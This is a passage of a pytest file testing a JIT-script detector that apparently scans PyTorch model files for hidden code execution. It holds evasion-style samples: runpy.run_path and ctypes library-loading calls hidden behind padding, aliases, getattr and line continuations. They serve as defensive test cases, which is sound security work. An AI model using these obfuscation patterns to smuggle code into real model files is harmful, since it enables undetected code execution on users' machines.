            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy as rp\n"
            + padding
            + b"rp.other = 1\nrp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_assignment_alias_call_after_priority_window(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff" + leading_blocks + b"import runpy\nrun = runpy.run_path\n" + padding + b"run('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_shadowed_late_assignment_alias_call_after_priority_window(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\nrun = runpy.run_path\n"
            + padding
            + b"run = len\n"
            + padding
            + b"run([])\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "shadow_block",
        [
            b"del c\n",
            b"(c := len)\n",
            b"for c in [len]:\n    pass\n",
            b"with contextlib.suppress(Exception) as c:\n    pass\n",
        ],
    )
    def test_scan_model_honors_late_ctypes_alias_shadowing_after_priority_window(self, shadow_block: bytes) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import ctypes as c\nimport contextlib\n"
            + padding
            + shadow_block
            + padding
            + b"c.CDLL('libpayload.so')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            finding.type == "code_execution_pattern" and finding.pattern == "Native library loading detected"
            for finding in findings
        )

    def test_scan_model_ignores_dead_branch_priority_import_after_default_cap(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"if False:\n    import runpy as rp\n"
            + padding
            + b"rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_indented_priority_import_after_default_cap(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        source = (
            b"\x00\xff" + leading_blocks + b"if True:\n" + b"    import runpy\n" + b"    runpy.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "compound_payload",
        [
            b"if flag:\n    pass\nelse:\n    import runpy\n    runpy.run_path('payload.py')\n",
            b"try:\n    pass\nexcept Exception:\n    import runpy\n    runpy.run_path('payload.py')\n",
            b"try:\n    pass\nfinally:\n    import runpy\n    runpy.run_path('payload.py')\n",
        ],
    )
    def test_scan_model_detects_clause_priority_import_after_default_cap(self, compound_payload: bytes) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        source = b"\x00\xff" + leading_blocks + compound_payload

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_alias_comparisons_before_late_priority_attribute_load(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        comparisons = b"".join(
            b"c == None\n" for _index in range(jit_script_module._MAX_PRIORITY_ALIAS_USAGE_LINES + 2)
        )
        source = b"\x00\xff" + leading_blocks + b"import ctypes as c\n" + padding + comparisons + b"c.cdll.msvcrt\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Native library loading detected" for f in findings
        )

    @pytest.mark.parametrize("filler_line", [b"foo(c=1)\n", b"obj.c = 1\n"])
    def test_scan_model_ignores_nonbinding_alias_syntax_before_late_priority_attribute_load(
        self, filler_line: bytes
    ) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        filler = filler_line * jit_script_module._MAX_PRIORITY_ALIAS_USAGE_LINES
        source = b"\x00\xff" + leading_blocks + b"import ctypes as c\n" + padding + filler + b"c.cdll.msvcrt\n"

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Native library loading detected" for f in findings
        )

    def test_scan_model_bounds_shadow_only_priority_lines_before_late_call(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        shadows = b"c = len\n" * jit_script_module._MAX_PRIORITY_ALIAS_USAGE_LINES
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import ctypes as c\n"
            + padding
            + shadows
            + b"import ctypes as c\n"
            + b"c.cdll.msvcrt\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Native library loading detected" for f in findings
        )

    @pytest.mark.parametrize(
        "shadow_line",
        [
            b"run, other = len, 1\n",
            b"(run) = len\n",
            b"[run] = [len]\n",
            b"other, (run, final) = 1, (len, 2)\n",
            b"*run, other = [len], 1\n",
        ],
    )
    def test_scan_model_honors_destructured_alias_shadowing_before_late_priority_call(self, shadow_line: bytes) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\nrun = runpy.run_path\n"
            + padding
            + shadow_line
            + padding
            + b"run([])\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "shadow_import",
        [
            b"import math as run\n",
            b"from math import sqrt as run\n",
        ],
    )
    def test_scan_model_honors_import_alias_shadowing_before_late_priority_call(self, shadow_import: bytes) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\nrun = runpy.run_path\n"
            + padding
            + shadow_import
            + padding
            + b"run(1)\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_keeps_scanning_after_shadow_only_priority_lines(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        shadows = b"c = len\n" * 512
        shadow_candidate = shadows + b"import ctypes as c\nc.cdll.msvcrt\n"
        usage_lines = jit_script_module._priority_alias_usage_lines(shadow_candidate, frozenset({b"c"}), 0)
        source = b"\x00\xff" + leading_blocks + b"import ctypes as c\n" + padding + shadow_candidate

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert len(usage_lines) <= jit_script_module._MAX_PRIORITY_ALIAS_USAGE_LINES
        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Native library loading detected" for f in findings
        )

    @pytest.mark.parametrize(
        "clause_source",
        [
            (b"def payload(flag):\n    if flag:\n        return None\n    else:\n        # pad\n"),
            (b"def payload():\n    try:\n        return None\n    except Exception:\n        # pad\n"),
            (b"def payload():\n    try:\n        value = 1\n    finally:\n        # pad\n"),
        ],
    )
    def test_scan_model_detects_deep_priority_import_inside_compound_clauses(self, clause_source: bytes) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"        # pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + clause_source
            + padding
            + b"        import runpy as rp\n"
            + b"        return rp.run_path('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_preserves_multiple_shadowed_aliases_before_late_safe_call(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\n"
            + b"a = runpy.run_path\n"
            + b"b = runpy.run_module\n"
            + b"c = runpy._run_module_as_main\n"
            + padding
            + b"a = len\n"
            + b"b = len\n"
            + b"c = len\n"
            + b"a([])\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_live_alias_call_on_shadow_line(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\n"
            + b"a = runpy.run_path\n"
            + b"b = runpy.run_module\n"
            + padding
            + b"a = len; b('payload')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_keeps_scanning_after_same_line_safe_shadow_call(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\n"
            + b"a = runpy.run_path\n"
            + b"b = runpy.run_module\n"
            + padding
            + b"a = len; a([])\n"
            + padding
            + b"b('payload')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_safe_same_line_shadow_calls_do_not_exhaust_priority_budget(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        safe_shadow_calls = b"".join(
            b"a = len; a([])\n" + padding for _index in range(jit_script_module._MAX_PRIORITY_ALIAS_USAGE_LINES + 2)
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\n"
            + b"a = runpy.run_path\n"
            + b"b = runpy.run_module\n"
            + padding
            + safe_shadow_calls
            + b"b('payload')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_indented_safe_same_line_shadow_calls_do_not_exhaust_priority_budget(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"    # pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        safe_shadow_calls = b"".join(
            b"    a = len; a([])\n" + padding for _index in range(jit_script_module._MAX_PRIORITY_ALIAS_USAGE_LINES + 2)
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"def payload():\n"
            + b"    import runpy\n"
            + b"    a = runpy.run_path\n"
            + b"    b = runpy.run_module\n"
            + padding
            + safe_shadow_calls
            + b"    return b('payload')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_same_line_call_before_shadow(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy\n"
            + b"a = runpy.run_path\n"
            + padding
            + b"a('payload.py'); a = len\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_same_line_alias_capture_before_shadow(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy as a\n"
            + padding
            + b"b = a.run_path; a = len\n"
            + padding
            + b"b('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_unrelated_assignment_alias_before_delayed_priority_call(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
            + b"import runpy as rp\nx = 1\n"
            + padding
            + b"x()\n"
            + padding
            + b"rp.run_path('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_late_function_local_assignment_alias_after_priority_window(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"    # pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = (
            b"\x00\xff" + leading_blocks + b"def payload():\n"
            b"    import runpy\n"
            b"    run = runpy.run_path\n" + padding + b"    return run('payload.py')\n"
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "call_line",
        [
            b"getattr(rp, 'run_path')('payload.py')\n",
            b"getattr(\n    rp, 'run_' + 'path'\n)('payload.py')\n",
        ],
    )
    def test_scan_model_detects_late_getattr_priority_alias_call(self, call_line: bytes) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = b"\x00\xff" + leading_blocks + b"import runpy as rp\n" + padding + call_line + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        ("import_line", "call_line"),
        [
            (b"from runpy import run_path as runner\n", b"(runner)('payload.py')\n"),
            (b"from runpy import run_path as runner\n", b"(\n runner\n)('payload.py')\n"),
            (b"from runpy import run_path as runner\n", b"(\n runner\n) \\\n('payload.py')\n"),
            (b"from runpy import run_path as runner\n", b"runner \\\n('payload.py')\n"),
            (b"import runpy as rp\n", b"((rp).run_path)('payload.py')\n"),
            (b"import runpy as rp\n", b"(\n rp.run_path\n)('payload.py')\n"),
            (b"import runpy as rp\n", b"(\n rp.run_path\n) \\\n('payload.py')\n"),
            (b"import runpy as rp\n", b"rp.run_path \\\n('payload.py')\n"),
            (b"import runpy as rp\n", b"rp \\\n    .run_path('payload.py')\n"),
        ],
    )
    def test_scan_model_detects_late_parenthesized_priority_alias_call(
        self, import_line: bytes, call_line: bytes
    ) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = b"\x00\xff" + leading_blocks + import_line + padding + call_line + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        ("late_bindings", "call_line"),
        [
            (b"runner = rp.run_path\n", b"runner('payload.py')\n"),
            (b"runner = rp.run_path\n", b"(runner)('payload.py')\n"),
            (b"runner = rp.run_path\n", b"(\n runner\n)('payload.py')\n"),
            (b"runner = rp.run_path\n", b"runner \\\n('payload.py')\n"),
            (b"first = rp.run_path\nrunner = first\n", b"(runner)('payload.py')\n"),
            (b"enabled = True\nrunner = rp.run_path if enabled else print\n", b"(runner)('payload.py')\n"),
            (b"runner = rp.run_path or print\n", b"(runner)('payload.py')\n"),
            (b"runner = False or rp.run_path\n", b"(runner)('payload.py')\n"),
            (
                b"enabled = True\nrunner = (\n    rp.run_path\n    if enabled\n    else print\n)\n",
                b"(runner)('payload.py')\n",
            ),
            (b"mod = rp\n", b"getattr(mod, 'run_path')('payload.py')\n"),
            (b"\x00\xffmod = rp\n", b"getattr(mod, 'run_path')('payload.py')\n"),
        ],
    )
    def test_scan_model_detects_late_derived_priority_alias_call(self, late_bindings: bytes, call_line: bytes) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        source = b"\x00\xff" + leading_blocks + b"import runpy as rp\n" + padding + late_bindings + call_line + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_long_late_derived_alias_chain_with_bounded_replay(self) -> None:
        detector = JITScriptDetector()
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        bindings = b"value_0 = rp.run_path\n" + b"".join(
            f"value_{index} = value_{index - 1}\n".encode() for index in range(1, 40_000)
        )
        source = b"\x00\xffimport runpy as rp\n" + padding + bindings + b"(value_39999)('payload.py')\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_long_passive_reference_chain_with_bounded_replay(self) -> None:
        detector = JITScriptDetector()
        padding_line = b"# pad\n"
        padding = padding_line * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(padding_line) + 8
        )
        bindings = b"value_0 = print(rp.run_path)\n" + b"".join(
            f"value_{index} = value_{index - 1}\n".encode() for index in range(1, 40_000)
        )
        source = b"\x00\xffimport runpy as rp\n" + padding + bindings + b"(value_39999)('safe')\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_forwarded_conditional_alias_beyond_replay_budget(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        bindings = b"enabled = True\nvalue_0 = rp.run_path if enabled else print\n" + b"".join(
            f"value_{index} = value_{index - 1}\n".encode() for index in range(1, 2_000)
        )
        source = b"\x00\xffimport runpy as rp\n" + padding + bindings + b"(value_1999)('payload.py')\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_ignores_long_chain_after_safe_module_rebind(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        bindings = b"rp = object()\nvalue_0 = rp.run_path\n" + b"".join(
            f"value_{index} = value_{index - 1}\n".encode() for index in range(1, 2_000)
        )
        source = b"\x00\xffimport runpy as rp\n" + padding + bindings + b"(value_1999)('safe')\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert not any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    @pytest.mark.parametrize(
        "line_suffix",
        [
            b"",
            b"  # inert",
            b";",
            b"; pass",
            b"; None",
            b"; ...",
            b"; ()",
            b"; []",
            b"; {}",
            b"; not None",
            b"; b''",
            b"; r''",
            b"; 1j",
            b"; 1e3",
            b"; 1_000",
            b"; 0x10",
            b"; 0b1",
            b"; b''; [1]",
            b"  # ; b''",
            b"  # ; 0x10",
            b"  # ; []",
        ],
    )
    def test_scan_model_detects_long_parenthesized_forwarding_chain_with_bounded_replay(
        self, line_suffix: bytes
    ) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        bindings = b"value_0 = rp.run_path\n" + b"".join(
            f"value_{index} = (value_{index - 1})".encode() + line_suffix + b"\n" for index in range(1, 40_000)
        )
        source = b"\x00\xffimport runpy as rp\n" + padding + bindings + b"(value_39999)('payload.py')\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_long_varying_literal_forwarding_suffixes_with_bounded_replay(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        bindings = b"value_0 = rp.run_path\n" + b"".join(
            f"value_{index} = (value_{index - 1}); [{index}]\n".encode() for index in range(1, 10_000)
        )
        source = b"\x00\xffimport runpy as rp\n" + padding + bindings + b"(value_9999)('payload.py')\n" + padding

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_deep_nested_inert_forwarding_suffix_without_recursion(self) -> None:
        detector = JITScriptDetector()
        padding = b"# pad\n" * (jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8)
        nested_literal = b"[" * 1_200 + b"0" + b"]" * 1_200
        source = (
            b"\x00\xffimport runpy as rp\n"
            + padding
            + b"runner = rp.run_path; "
            + nested_literal
            + b"\n(runner)('payload.py')\n"
            + padding
        )

        findings = detector.scan_model(source, "pytorch", "payload.bin")

        assert any(
            f.type == "code_execution_pattern" and f.pattern == "Dynamic module execution detected" for f in findings
        )

    def test_scan_model_detects_parenthesized_priority_alias_across_retained_boundary(self) -> None:
        detector = JITScriptDetector()
        leading_blocks = b"".join(
            f"def benign_{index}():\n    return {index}\n}}\x00".encode()
            for index in range(jit_script_module._MAX_DEFAULT_EMBEDDED_PYTHON_SNIPPETS + 2)
        )
        import_line = b"from runpy import run_path as runner\n"
        boundary_padding_length = (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES - len(import_line) - len(b"(\n")
        )
        boundary_padding = b"#" + b"x" * (boundary_padding_length - 2) + b"\n"
        trailing_padding = b"# pad\n" * (
            jit_script_module._MAX_PRIORITY_EMBEDDED_PYTHON_SNIPPET_BYTES // len(b"# pad\n") + 8
        )
        source = (
            b"\x00\xff"
            + leading_blocks
